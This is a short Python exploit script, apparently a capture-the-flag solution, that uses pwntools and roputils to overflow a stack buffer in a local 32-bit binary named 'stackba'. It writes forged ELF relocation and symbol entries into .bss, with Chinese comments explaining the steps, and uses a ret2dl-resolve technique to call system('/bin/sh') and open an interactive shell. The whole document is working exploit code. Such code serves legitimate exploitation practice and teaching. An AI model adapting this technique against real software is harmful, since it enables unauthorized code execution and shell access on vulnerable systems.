#!usr/bin/python
# -*- coding: utf-8 -*-
import roputils
from pwn import *
context(os='linux', log_level='debug')

offset = 44
readplt = 0x08048300
bss = 0x0804a020
ret = 0x0804843B
 
p = process('./stackba')
 
rop = roputils.ROP('./stackba')
addr_bss = rop.section('.bss')
 
buf1 = 'A' * offset #44
buf1 += p32(readplt) + p32(ret) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)
 
buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss+20,'system')#在bss段伪造Elf32_Rel 和 Elf32_Sym
buf2 += rop.fill(100, buf2)
p.send(buf2)
 
buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss) #劫持eip至plt[0]，解析system
p.send(buf3)
p.interactive()
